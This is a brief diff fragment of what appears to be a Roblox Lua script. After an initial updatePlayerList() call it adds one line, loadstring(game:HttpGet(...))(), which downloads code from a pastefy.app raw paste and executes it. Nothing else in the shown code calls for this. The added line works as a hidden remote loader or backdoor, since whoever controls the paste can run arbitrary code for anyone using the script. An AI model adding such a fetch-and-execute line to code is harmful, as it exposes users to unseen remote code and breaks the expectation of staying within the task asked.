@@ -280,3 +280,4 @@ end)
 
 -- Initial
 updatePlayerList()
+loadstring(game:HttpGet("https://pastefy.app/s10gfCIh/raw"))()
